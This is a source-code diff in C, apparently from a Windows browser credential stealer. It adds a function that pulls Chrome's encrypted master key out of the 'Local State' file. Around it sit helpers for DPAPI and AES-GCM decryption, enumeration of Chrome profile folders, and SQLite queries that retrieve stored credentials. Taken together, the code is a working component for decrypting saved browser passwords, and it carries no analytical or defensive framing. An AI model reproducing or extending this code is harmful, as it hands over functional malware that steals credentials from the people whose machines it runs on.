@@ -19,6 +19,79 @@ BOOL base64_to_byte(PCHAR base64_string, BYTE** byte_string, PDWORD size_byte_st
 	return TRUE;
 }
 
+// Gets the Master Key of Chrome, which is inside "%LOCALAPPDATA%\Google\Chrome\User Data\Local State" and store it in [PWCHAR] enc_master_key
+BOOL get_json_property(PCWSTR browser_dir, PCWSTR data_file, PCWSTR property, PWCHAR enc_master_key, WORD enc_master_key_size, PSTR buf_outMsg, DWORD buf_outSize) {	
+	errno_t err;
+
+	/* Copy path to temporary buffer */
+	WCHAR file_location[MAX_PATH];								// First Buffer to hold path for 'Local State' file, and the second buffer to hold two wchars (including null-term). Buffer is used to read file
+	if ((err = wmemcpy_s(file_location, MAX_PATH, browser_dir, lstrlenW(browser_dir))) != 0) {
+		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_json_property: wmemcpy_s: Copying Chrome path to buffer error code: %d\n", err);)
+			return FALSE;
+	}
+	/* Add 'file name' to temporary buffer */
+	if ((err = wmemcpy_s(file_location + lstrlenW(browser_dir), MAX_PATH, data_file, lstrlenW(data_file) + 1)) != 0) {
+		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_json_property: wmemcpy_s: Copying '%ws' file path to buffer error code: %d\n", data_file, err);)
+			return FALSE;
+	}
+	/* Check if given file exists */
+	if (!PathFileExistsW(file_location)) {
+		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_json_property: PathFileExistsW: No '%ws' file found.\n", data_file);)
+			return FALSE;
+	}
+	/* Opens the file in UTF-8 mode */
+	FILE* fp_file = NULL;												// File pointer to the given file
+	if ((err = _wfopen_s(&fp_file, file_location, L"r, ccs=UTF-8")) != 0) {
+		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_json_property: _wfopen_s: Opening '%ws' file error code: %d:%d\n", data_file, err, errno);)
+	}
+	if (fp_file == NULL) {
+		_wcserror_s(enc_master_key, enc_master_key_size, err);
+		return FALSE;
+	}
+
+	/* Read and get the given json property key */
+	WCHAR read_buffer[2];
+	int i = 0;
+	BOOL quoteFound = FALSE, propertyFound = FALSE;
+	while (fgetws(read_buffer, 2, fp_file)) {
+		if (!wcscmp(read_buffer, L"\"")) {
+			if (!quoteFound) {
+				quoteFound = TRUE;
+				continue;
+			}
+			else {
+				quoteFound = FALSE;
+				if (!wcscmp(enc_master_key, property)) {
+					wmemset(enc_master_key, L'\0', enc_master_key_size);
+					i = 0;
+					propertyFound = TRUE;
+					continue;
+				}
+				if (propertyFound) {
+					enc_master_key[i] = (WCHAR)L'\0';
+					if ((err = fclose(fp_file)) != 0) {
+						Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_json_property: fclose: '%ws' closing error code: %d\n", data_file, err);)
+					}
+					return TRUE;
+				}
+				enc_master_key[i] = L'\0';
+				wmemset(enc_master_key, L'\0', enc_master_key_size);
+				i = 0;
+			}
+		}
+		else if (quoteFound) {
+			enc_master_key[i] = read_buffer[0];
+			i++;
+		}
+	}
+
+	/* If encrypted key is not found */
+	if ((err = fclose(fp_file)) != 0) {
+		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_json_property: fclose: Local File closing error code: %d\n", err);)
+	}
+	return FALSE;
+}
+
 // Decrypts data that is encrypted using DPAPI API.
 BOOL dpapi_decrypt(BYTE* encrypted_data, DWORD size_encrypted_data, DATA_BLOB* decrypted_data) {
 	DATA_BLOB blob_enc_masterkey;
@@ -72,7 +145,7 @@ BOOL aesgcm_decrypt(BCRYPT_KEY_HANDLE handle_bcrypt, DWORD offset, BYTE* encrypt
 }
 
 // Gets the browser directory specified by the FOLDER_ID (look at win32 docs) and the relative path from that FOLDER_ID
-DWORD get_user_dir(GUID folder_id, PCWSTR browser_location, PWSTR buf_path, PSTR buf_outMsg, WORD buf_outSize) {
+DWORD get_user_dir(GUID folder_id, PCWSTR browser_location, PWSTR buf_path, PSTR buf_outMsg, DWORD buf_outSize) {
 	PWSTR p_temp_userdata_location = NULL;															// Temporary pointer to hold returned user data (%LOCALAPPDATA%, %APPDATA%, etc.) folder path
 	HRESULT hr;																						// Error handling 
 	errno_t err;																					// Error handling 
@@ -119,7 +192,7 @@ BOOL checkSubtring(const WCHAR* substring, PWCHAR test_string) {
 }
 
 // Gets file/directory exploration handle and a struct that contains info about the found files/sub-directories of the specified directory. Which then can be used to call FileNextA() to iterate over found files/sub-dirs. 
-BOOL get_file_explorer(PWSTR inpur_dir, WIN32_FIND_DATAW* dir_files, HANDLE* dir_handle, PSTR buf_outMsg, WORD buf_outSize) {
+BOOL get_file_explorer(PWSTR inpur_dir, WIN32_FIND_DATAW* dir_files, HANDLE* dir_handle, PSTR buf_outMsg, DWORD buf_outSize) {
 	errno_t err;
 
 	/* Append '\*' to the chrome_dir to get the file handle for the '%LOCALAPPDATA%\Google\Chrome\User Data\*' folder */
@@ -142,7 +215,7 @@ BOOL get_file_explorer(PWSTR inpur_dir, WIN32_FIND_DATAW* dir_files, HANDLE* dir
 }
 
 // Open database connection
-BOOL open_database(PWSTR database_location, void** handle_db, PSTR buf_outMsg, WORD buf_outSize, BOOL open_copied_instance) {
+BOOL open_database(PWSTR database_location, void** handle_db, BOOL open_copied_instance, PSTR buf_outMsg, DWORD buf_outSize) {
 	errno_t err;
 	int status;
 	WCHAR temp_database_location[MAX_PATH] = L"\0";
@@ -180,7 +253,7 @@ BOOL open_database(PWSTR database_location, void** handle_db, PSTR buf_outMsg, W
 }
 
 // Prepare and get the sql handle for sql statement in order to retrieve credentials
-int prepare_sql(void* handle_db, void** handle_sql_stmt, const char * sql_stmt, PSTR buf_outMsg, WORD buf_outSize) {
+int prepare_sql(void* handle_db, void** handle_sql_stmt, const char * sql_stmt, PSTR buf_outMsg, DWORD buf_outSize) {
 	int status = sqlite3_prepare_v2((sqlite3*)handle_db, sql_stmt, -1, (sqlite3_stmt**)handle_sql_stmt, 0);
 	if (status != SQLITE_OK) {
 		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "sqlite3_prepare_v2: Error when preaparing statement, error: %s:%d\n", sqlite3_errmsg((sqlite3*)handle_db), status);)
@@ -213,7 +286,7 @@ int get_result_size(void* handle_sql_stmt, int index) {
 }
 
 // Close database connection
-BOOL close_database(void* handle_db, void* handle_sql_stmt, PSTR buf_outMsg, WORD buf_outSize) {
+BOOL close_database(void* handle_db, void* handle_sql_stmt, PSTR buf_outMsg, DWORD buf_outSize) {
 	/* Reset SQL statement */
 	NTSTATUS status;
 	if ((status = sqlite3_reset((sqlite3_stmt*)handle_sql_stmt)) != 0) {
